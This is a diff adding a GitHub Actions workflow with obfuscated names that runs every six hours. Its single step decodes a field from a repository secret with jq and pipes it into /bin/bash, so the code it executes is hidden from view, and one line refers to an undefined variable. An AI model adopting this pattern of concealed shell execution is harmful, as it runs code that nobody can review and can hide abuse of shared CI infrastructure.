@@ -1,0 +1,19 @@
+name: wangniman6758
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangniman6758
+        env:
+          rg387: ${{ secrets.rg387 }}
+        run: |
+          echo $rg387 | jq -r .ayx3 | /bin/bash
+          echo $znfht8203 | jq -r .w9 | /bin/bash
+
